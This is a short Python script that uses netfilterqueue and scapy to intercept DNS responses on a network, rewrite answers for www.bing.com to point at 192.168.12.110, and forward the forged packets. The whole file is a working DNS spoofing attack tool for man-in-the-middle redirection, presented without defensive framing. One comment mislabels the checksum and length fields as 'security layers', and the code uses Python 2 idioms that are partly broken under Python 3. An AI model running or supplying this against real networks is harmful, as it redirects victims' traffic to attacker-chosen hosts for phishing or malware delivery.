import netfilterqueue
import scapy.all as scapy


def process_packet(packet) -> None:
    '''Accepts a packets and print it'''
    # converting packets to scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packets.show())
    
    # checking a packet has dns response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.12.110")
            scapy_packet[scapy.DNS].an = answer # modifying the DNS packet layer
            scapy_packet[scapy.DNS].ancount = 1 # changing number of response to 1
            
            # deleting the packet security layers
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(str(scapy_packet))
    # print(packet.get_payload()) # for printing details of packets
    packet.accept() # To accept packet and forward it to destination
    # packet.drop() # To accept packet and drop it


queue = netfilterqueue.NetfilterQueue() # initiating a object
queue.bind(0, process_packet) # binding a queue of iptable here 0 is the queue number
queue.run() # running a queue of iptable